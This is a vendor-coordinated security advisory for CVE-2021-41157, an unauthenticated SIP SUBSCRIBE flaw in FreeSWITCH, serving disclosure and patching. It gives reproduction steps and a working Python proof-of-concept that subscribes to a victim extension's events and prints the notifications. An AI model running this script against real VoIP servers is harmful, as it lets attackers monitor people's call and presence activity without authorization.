# FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default

- Fixed versions: v1.10.7
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-08-freeswitch-SIP-SUBSCRIBE-without-auth
- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-g7xg-7c54-rmpj
- Other references: CVE-2021-41157
- Tested vulnerable versions: <= v1.10.5
- Timeline:
    - Report date: 2021-06-07
    - Triaged: 2021-06-08
    - Fix provided for testing: 2021-10-01
    - Vendor release with fix: 2021-10-24
    - Enable Security advisory: 2021-10-25

## Description

By default, SIP requests of the type SUBSCRIBE are not authenticated in the affected versions of FreeSWITCH. Although this issue was [fixed][1] in version v1.10.6, installations upgraded to the fixed version of FreeSWITCH from an older version, may still be vulnerable if the configuration is not updated accordingly. For good reason, by default, software upgrades do not update the configuration.

[1]: https://github.com/signalwire/freeswitch/commit/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e

## Impact

Abuse of this security issue allows attackers to subscribe to user agent event notifications without the need to authenticate. This abuse poses privacy concerns and might lead to social engineering or similar attacks. For example, attackers may be able to monitor the status of target SIP extensions.

## How to reproduce the issue

1. Install FreeSWITCH v1.10.5 or lower
2. Run FreeSWITCH using the default configuration
3. Register as a legitimate SIP user on the FreeSWITCH server using a softphone (e.g. sip:1000@192.168.188.128 where 192.168.188.128 is your FreeSWITCH server)
4. Save the below Python script to `anon-subscribe.py`
5. Run the script from an IP address that is different from that of the softphone `python anon-subscribe.py <freeswitch_ip> <freeswitch_port> <victim_extension>`
6. Perform some operations using the softphone, such as deregistering, registering, and placing a call
7. Observe that several notifications are received by the script, exposing the actions being performed by the victim

```python
import socket, string, random, re, sys

UDP_IP = sys.argv[1]
UDP_PORT = int(sys.argv[2])
EXT = sys.argv[3]
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

msg_template = "SUBSCRIBE sip:%s@%s;transport=UDP SIP/2.0\r\n" % (EXT, UDP_IP) + \
    "Via: SIP/2.0/UDP [ip]:[port];rport;branch=z9hG4bK-[rand]\r\n" \
    "Max-Forwards: 70\r\n" \
    "Contact: <sip:%s@[ip]:[port];transport=udp>\r\n" % (EXT, ) + \
    "To: <sip:%s@%s;transport=UDP>\r\n" % (EXT, UDP_IP) + \
    "From: <sip:9999@%s;transport=UDP>;tag=[rand]\r\n" % (UDP_IP, ) + \
    "Call-ID: [rand]\r\n" \
    "CSeq: 1 SUBSCRIBE\r\n" \
    "Expires: 600\r\n" \
    "Accept: */*\r\n" \
    "Event: [event]\r\n" \
    "Content-Length: 0\r\n" \
    "\r\n"

rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
msg = msg_template.replace('[ip]', '127.0.0.1') \
    .replace('[port]', '9999') \
        .replace('[event]', 'dialog') \
            .replace('[rand]', rand)

sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))

recv=sock.recv(10240).decode()

# get rport and received from Via header
rport=re.search( r'rport=([0-9]+)', recv, re.MULTILINE).group(1)
received=re.search( r'received=([0-9\.]+)', recv, re.MULTILINE).group(1)

events = [
    'talk', 'hold', 'conference', 'presence', 'as-feature-event', 'dialog', 'line-seize', 
    'call-info', 'sla', 'include-session-description', 'presence.winfo', 'message-summary', 
    'refer']

for event in events:
    rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
    msg = msg_template.replace('[ip]', received) \
        .replace('[port]', rport) \
            .replace('[event]', event) \
                .replace('[rand]', rand)
    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))

while True:
    print(sock.recv(10240).decode().split('\r\n\r\n')[1])
```

## Solution and recommendations

Upgrade to a version of FreeSWITCH that fixes this issue.

Our suggestion to the FreeSWITCH developers was the following:

> Our recommendation is that SIP SUBSCRIBE messages are authenticated by default so that FreeSWITCH administrators do not need to explicitly set the `auth-subscriptions` parameter. When following such a recommendation, a new parameter can be introduced to explicitly disable authentication.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

